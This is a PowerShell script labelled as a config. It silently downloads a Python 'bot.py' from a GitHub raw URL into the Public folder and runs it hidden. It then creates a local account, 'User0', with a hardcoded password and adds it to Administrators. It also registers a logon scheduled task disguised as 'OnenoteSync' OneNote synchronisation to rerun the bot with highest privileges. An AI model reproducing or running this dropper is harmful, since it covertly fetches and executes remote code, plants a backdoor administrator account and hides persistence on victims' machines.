# CONFIG
# ================================
cd $env:PUBLIC *> $null
curl 'https://raw.githubusercontent.com/Dangongg/expert-octo-broccoli/refs/heads/main/bot.py' -o 'bot.py' *> $null
Start-Process pythonw.exe -ArgumentList "C:/Users/Public/bot.py" *> $null

$Username = "User0"
$PasswordPlain = "donotusethisasyourpassword"
$PythonPath = "python.exe"
$ScriptPath = "C:\User\Public\bot.py"
$TaskName = "OnenoteSync"
$TaskDescription = "Synchronize OneNote notebooks at logon"
$Password = $PasswordPlain | ConvertTo-SecureString -AsPlainText -Force
New-LocalUser -Name $Username -Password $Password -FullName $Username -Description "Local admin for scheduled tasks" -ErrorAction Stop
Add-LocalGroupMember -Group "Administrators" -Member $Username -ErrorAction Stop
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Action = New-ScheduledTaskAction -Execute $PythonPath -Argument "`"$ScriptPath`""
$Principal = New-ScheduledTaskPrincipal -UserId ".\$Username" -LogonType Password -RunLevel Highest
$Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Principal $Principal -Description $TaskDescription
Register-ScheduledTask -TaskName $TaskName -InputObject $Task -User ".\$Username" -Password $PasswordPlain



pause
